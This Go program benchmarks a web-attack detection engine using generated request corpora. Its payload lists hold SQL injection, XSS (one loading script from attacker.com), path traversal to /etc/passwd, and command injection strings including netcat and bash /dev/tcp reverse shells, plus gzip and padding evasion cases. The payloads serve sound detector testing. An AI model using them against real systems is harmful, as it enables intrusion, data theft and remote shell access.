package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/mirage-proxy/mirage/internal/detect"
)

type BenchmarkResult struct {
	CorpusName string
	Total      int
	Detected   int
	Blocked    int
	Errors     int
	AvgTime    time.Duration
	P99Time    time.Duration
}

func main() {
	fmt.Println("=================================================================")
	fmt.Println(" Project Mirage Phase 2 Detection Engine Evaluation & Benchmarking")
	fmt.Println("=================================================================")

	cfg := detect.DefaultConfig()
	cfg.Timeout = 50 * time.Millisecond
	detector, err := detect.NewCorazaDetector(cfg)
	if err != nil {
		fmt.Printf("Failed to initialize detector: %v\n", err)
		os.Exit(1)
	}

	results := []BenchmarkResult{
		evalCorpus(detector, "SQL Injection (SQLi)", generateSQLiPayloads()),
		evalCorpus(detector, "Cross-Site Scripting (XSS)", generateXSSPayloads()),
		evalCorpus(detector, "Path Traversal (LFI/RFI)", generatePathTraversalPayloads()),
		evalCorpus(detector, "Command Injection (RCE)", generateCommandInjectionPayloads()),
		evalCorpus(detector, "Gzip Encoded Attack Body", generateGzipPayloads()),
		evalCorpus(detector, "Padding Evasion (>32KB)", generatePaddingPayloads()),
		evalCorpus(detector, "Benign Clean Requests", generateBenignRequests()),
	}

	fmt.Println("\n---------------------------------------------------------------------------------------------------")
	fmt.Printf("%-30s | %-6s | %-8s | %-12s | %-12s\n", "Corpus Source", "Total", "Flagged", "Detect Rate", "P99 Latency")
	fmt.Println("---------------------------------------------------------------------------------------------------")

	totalMalicious := 0
	detectedMalicious := 0
	totalBenign := 0
	fpBenign := 0

	for _, r := range results {
		rate := float64(r.Detected) / float64(r.Total) * 100.0
		fmt.Printf("%-30s | %-6d | %-8d | %-11.2f%% | %-12v\n", r.CorpusName, r.Total, r.Detected, rate, r.P99Time)

		if r.CorpusName == "Benign Clean Requests" {
			totalBenign += r.Total
			fpBenign += r.Detected
		} else {
			totalMalicious += r.Total
			detectedMalicious += r.Detected
		}
	}

	fmt.Println("---------------------------------------------------------------------------------------------------")
	overallDetectRate := float64(detectedMalicious) / float64(totalMalicious) * 100.0
	fpRate := float64(fpBenign) / float64(totalBenign) * 100.0
	fmt.Printf("\nOverall Attack Detection Rate: %.2f%% (%d/%d)\n", overallDetectRate, detectedMalicious, totalMalicious)
	fmt.Printf("Overall False Positive Rate:   %.2f%% (%d/%d)\n", fpRate, fpBenign, totalBenign)
}

func evalCorpus(d detect.Detector, name string, reqs []*http.Request) BenchmarkResult {
	ctx := context.Background()
	total := len(reqs)
	detected := 0
	errs := 0

	durations := make([]time.Duration, 0, total)
	var sumTime time.Duration

	for _, req := range reqs {
		start := time.Now()
		v, err := d.Inspect(ctx, req)
		elapsed := time.Since(start)

		durations = append(durations, elapsed)
		sumTime += elapsed

		if err != nil {
			errs++
		}
		if v.Malicious {
			detected++
		}
	}

	// Calculate P99
	p99Idx := int(float64(len(durations)) * 0.99)
	if p99Idx >= len(durations) {
		p99Idx = len(durations) - 1
	}

	return BenchmarkResult{
		CorpusName: name,
		Total:      total,
		Detected:   detected,
		Errors:     errs,
		AvgTime:    sumTime / time.Duration(total),
		P99Time:    durations[p99Idx],
	}
}

func makeReq(method, path string, body string) *http.Request {
	var r *http.Request
	if body != "" {
		r = httptest.NewRequest(method, path, strings.NewReader(body))
	} else {
		r = httptest.NewRequest(method, path, nil)
	}
	r.Host = "localhost"
	r.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
	r.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9")
	return r
}

func generateSQLiPayloads() []*http.Request {
	templates := []string{
		"' OR '1'='1' --",
		"1 UNION SELECT username, password FROM users",
		"admin' --",
		"1; DROP TABLE users; --",
		"' OR 1=1 #",
		"' UNION SELECT 1, @@version, 3 --",
		"1' AND SLEEP(5) --",
		"' OR 'a'='a",
		"1 AND 1=1",
		"' HAVING 1=1 --",
	}
	reqs := make([]*http.Request, 0, 50)
	for i := 0; i < 50; i++ {
		p := templates[i%len(templates)]
		reqs = append(reqs, makeReq("GET", "/api/search?q="+url.QueryEscape(p), ""))
	}
	return reqs
}

func generateXSSPayloads() []*http.Request {
	templates := []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert('xss')>",
		"<svg onload=alert(document.cookie)>",
		"javascript:alert(1)",
		"<body onload=alert('XSS')>",
		"<iframe src=\"javascript:alert('XSS')\"></iframe>",
		"<a href=\"javascript:alert('XSS')\">click me</a>",
		"<input type=\"text\" value=\"\" onfocus=\"alert(1)\">",
		"'\"><script>alert(1)</script>",
		"<script src=http://attacker.com/xss.js></script>",
	}
	reqs := make([]*http.Request, 0, 50)
	for i := 0; i < 50; i++ {
		p := templates[i%len(templates)]
		reqs = append(reqs, makeReq("GET", "/comment?msg="+url.QueryEscape(p), ""))
	}
	return reqs
}

func generatePathTraversalPayloads() []*http.Request {
	templates := []string{
		"../../../../etc/passwd",
		"..%2f..%2f..%2fetc%2fpasswd",
		"../../../../windows/win.ini",
		"/etc/passwd",
		"../../../../boot.ini",
		"..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"....//....//....//etc/passwd",
		"/proc/self/environ",
		"../../../../var/log/apache2/access.log",
		"file:///etc/passwd",
	}
	reqs := make([]*http.Request, 0, 50)
	for i := 0; i < 50; i++ {
		p := templates[i%len(templates)]
		reqs = append(reqs, makeReq("GET", "/download?file="+url.QueryEscape(p), ""))
	}
	return reqs
}

func generateCommandInjectionPayloads() []*http.Request {
	templates := []string{
		"127.0.0.1; cat /etc/passwd",
		"127.0.0.1 | id",
		"127.0.0.1 && whoami",
		"$(whoami)",
		"`id`",
		"127.0.0.1; nc -e /bin/sh attacker.com 4444",
		"127.0.0.1 | bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
		"; ls -la",
		"|| id",
		"& ping -c 4 127.0.0.1 &",
	}
	reqs := make([]*http.Request, 0, 50)
	for i := 0; i < 50; i++ {
		p := templates[i%len(templates)]
		r := makeReq("POST", "/api/ping", "ip="+url.QueryEscape(p))
		r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		reqs = append(reqs, r)
	}
	return reqs
}

func generateGzipPayloads() []*http.Request {
	reqs := make([]*http.Request, 0, 25)
	sqli := "' OR '1'='1' --"
	for i := 0; i < 25; i++ {
		var buf bytes.Buffer
		gw := gzip.NewWriter(&buf)
		_, _ = gw.Write([]byte("query=" + url.QueryEscape(sqli)))
		gw.Close()

		r := httptest.NewRequest("POST", "/api/search", &buf)
		r.Host = "localhost"
		r.Header.Set("User-Agent", "Mozilla/5.0")
		r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		r.Header.Set("Content-Encoding", "gzip")
		reqs = append(reqs, r)
	}
	return reqs
}

func generatePaddingPayloads() []*http.Request {
	reqs := make([]*http.Request, 0, 25)
	padding := strings.Repeat("A", 33000)
	sqli := "' OR '1'='1' --"
	for i := 0; i < 25; i++ {
		body := `{"padding":"` + padding + `","query":"` + sqli + `"}`
		r := httptest.NewRequest("POST", "/api/data", strings.NewReader(body))
		r.Host = "localhost"
		r.Header.Set("User-Agent", "Mozilla/5.0")
		r.Header.Set("Content-Type", "application/json")
		reqs = append(reqs, r)
	}
	return reqs
}

func generateBenignRequests() []*http.Request {
	reqs := make([]*http.Request, 0, 500)
	paths := []string{"/", "/about", "/products?id=12", "/contact", "/search?q=security+proxy", "/api/v1/users", "/items?category=electronics&page=2"}
	for i := 0; i < 500; i++ {
		p := paths[i%len(paths)]
		r := makeReq("GET", p, "")
		reqs = append(reqs, r)
	}
	return reqs
}
